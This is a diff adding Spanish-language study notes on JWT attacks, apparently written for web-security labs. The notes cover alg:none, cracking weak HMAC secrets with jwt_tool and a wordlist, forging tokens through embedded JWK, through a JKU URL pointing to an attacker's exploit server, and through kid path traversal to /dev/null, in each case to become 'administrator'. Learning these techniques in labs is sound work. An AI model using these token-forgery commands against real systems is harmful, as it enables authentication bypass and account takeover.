@@ -1,0 +1,50 @@
+Metadatos-Payload-Firma
+JWS - Signature- Firmado
+JWE - encryption - Encriptado
+JWK - Json web Key
+JKU - Json web Key set URL --> los servers buscan aquí la clave
+KID - Proporciona un id cada Json
+/.well-known/jwks.json --> buscar info aquí
+Content-Type: text/xml o application/x-java-serialized-object ataque XXE o deserialización
+https://jwt.io/
+https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list --> wordlist
+
+alg: none --> no verifica algoritmo
+
+cogemos nuestro JWT crackeamos clave, y después modificamos valores de algoritmo y administrator
+sudo python3 jwt_tool.py JWT -C -d /usr/share/wordlists/jwt.secrets.list 
+sudo python3 jwt_tool.py JWT -C -d /usr/share/wordlists/jwt.secrets.list -S hs256 -p "secret1" -T
+
+VULN JWK 
+Creo una clave RSA jwk 2048 y genero id
+cambio sub  a administrator por wiener
+JWK embebido anteriormente creado, firmo y cambio el JWT en browser
+
+VULN JKU
+Creo una clave RSA jwk 2048 y genero id
+Copio todo lo que me da la firma en exploitserver
+{
+    "keys": [  
+    {      
+    `Aquí copiamos el jwk que acabamos de generar`
+    }
+	    ]
+}
+
+cambio /exploit por /.well-known/jwks.json
+copio kid y sustituyo en el JWT real
+en JWT inserto un collaborator Payload
+en jku pongo http://exploitserver.com/.well-known/jwks.json
+cambio wiener por administrator y firmo
+
+
+JWT weak HMAC secret
+VULN kid path traversal - escaner no nos canta nada
+creo clave simétrica random y cambio  k: AA==
+en kid: ../../../../dev/null
+sub a administrator
+firmo con la firma creada y copia JWT
+
+cojo mi JWT con jwt_tool selecciono valores e inyecto después
+sudo python jwt_tool.py JWT -I -hc kid -hv '../../../../../../../dev/null' -pc sub -pv administrator -S hs256 -p ''
+cambio JWT en browser
